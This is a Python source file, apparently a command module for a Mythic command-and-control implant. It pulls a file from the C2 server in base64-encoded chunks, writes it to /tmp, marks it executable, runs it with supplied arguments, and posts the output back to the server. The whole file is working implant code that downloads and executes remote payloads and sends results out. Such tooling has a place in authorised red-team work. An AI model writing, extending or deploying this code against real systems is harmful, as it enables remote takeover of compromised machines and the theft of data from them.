import os
import json
import base64
import subprocess
import uuid

CHUNK_SIZE = 512 * 1024  # 512 KB


# Requests a single chunk of a Mythic-hosted file via the upload wire protocol and returns the response dict
def _fetch_chunk(callback_id, task_id, file_id, chunk_num):
    import agent  # deferred to avoid circular import — agent.py imports this module
    body = {
        "action": "post_response",
        "uuid": callback_id,
        "responses": [{
            "task_id": task_id,
            "upload": {
                "chunk_size": CHUNK_SIZE,
                "file_id":    file_id,
                "chunk_num":  chunk_num,
                "full_path":  "",
            },
        }],
    }
    encoded = base64.b64encode((callback_id + json.dumps(body)).encode())
    r = agent.SESSION.post(f"{agent.BASE_URL}/agent_message", data=encoded, timeout=30)
    resp = json.loads(base64.b64decode(r.content)[36:])
    return resp.get("responses", [{}])[0]


# Fetches a Python script from Mythic, writes it to /tmp, executes it with optional args,
# posts the output back, then cleans up the temp file regardless of outcome
def execute(params, task_id, callback_id):
    import agent  # deferred to avoid circular import — agent.py imports this module
    try:
        parsed = json.loads(params)
        file_id = parsed.get("file", "").strip()
        args_str = parsed.get("args", "").strip()
    except Exception:
        agent.post_response(callback_id, task_id, "runpy: invalid parameters")
        return None

    if not file_id:
        agent.post_response(callback_id, task_id, "runpy: file is required")
        return None

    tmp_path = f"/tmp/{uuid.uuid4().hex}"
    try:
        # Fetch compiled binary from Mythic using chunked transfer
        chunk_resp = _fetch_chunk(callback_id, task_id, file_id, 1)
        total_chunks = chunk_resp.get("total_chunks", 1)
        binary_data = base64.b64decode(chunk_resp.get("chunk_data", ""))

        for chunk_num in range(2, total_chunks + 1):
            chunk_resp = _fetch_chunk(callback_id, task_id, file_id, chunk_num)
            binary_data += base64.b64decode(chunk_resp.get("chunk_data", ""))

        # Write binary to temp file, make executable, and run directly — no python3 needed
        with open(tmp_path, "wb") as fh:
            fh.write(binary_data)
        os.chmod(tmp_path, 0o755)

        cmd = [tmp_path] + (args_str.split() if args_str else [])
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        output = result.stdout + result.stderr
        agent.post_response(callback_id, task_id, output if output else "(no output)")

    except subprocess.TimeoutExpired:
        agent.post_response(callback_id, task_id, "runpy: script timed out after 60 seconds")
    except Exception as e:
        agent.post_response(callback_id, task_id, f"runpy error: {str(e)}")
    finally:
        if os.path.exists(tmp_path):
            os.remove(tmp_path)

    return None  # always — this command manages all its own posts
